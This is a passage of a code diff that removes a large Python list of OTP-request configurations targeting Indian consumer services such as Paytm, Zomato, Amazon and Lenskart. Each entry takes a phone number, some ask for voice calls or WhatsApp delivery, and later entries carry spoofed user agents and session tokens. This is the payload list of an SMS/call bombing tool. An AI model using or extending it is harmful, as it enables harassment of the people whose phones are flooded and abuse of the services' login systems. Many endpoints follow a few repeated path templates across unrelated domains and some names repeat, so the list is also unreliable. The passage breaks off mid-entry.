-    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Cred Call', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-
-    # ─── From third code block (API_CONFIGS) ───
-    {
-        "name": "lenskart_2",
-        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "X-API-Client": "mobilesite",
-            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
-            "Origin": "https://www.lenskart.com",
-            "Referer": "https://www.lenskart.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
-    },
-    {
-        "name": "gopinkcabs_2",
-        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://www.gopinkcabs.com",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"check_mobile_number=1&contact={p}"
-    },
-    {
-        "name": "shemaroome_2",
-        "url": "https://www.shemaroome.com/users/resend_otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://www.shemaroome.com",
-            "Referer": "https://www.shemaroome.com/users/sign_in",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"mobile_no=%2B91{p}"
-    },
-    {
-        "name": "kpnfresh_web_3",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
-        "method": "POST",
-        "headers": {
-            "sec-ch-ua-platform": "\"Android\"",
-            "x-channel-id": "WEB",
-            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/json",
-            "origin": "https://www.kpnfresh.com",
-            "referer": "https://www.kpnfresh.com/"
-        },
-        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
-    },
-    {
-        "name": "kpnfresh_and_2",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
-        "method": "POST",
-        "headers": {
-            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
-            "x-app-version": "3.2.6",
-            "content-type": "application/json; charset=UTF-8",
-            "user-agent": "okhttp/5.0.0-alpha.11"
-        },
-        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
-    },
-    {
-        "name": "bikefixup_2",
-        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
-        "method": "POST",
-        "headers": {
-            "accept": "application/json",
-            "client": "app",
-            "content-type": "application/json; charset=UTF-8",
-            "user-agent": "Dart/3.6 (dart:io)"
-        },
-        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
-    },
-    {
-        "name": "rappi_2",
-        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
-        "method": "POST",
-        "headers": {
-            "Deviceid": "5df83c463f0ff8ff",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
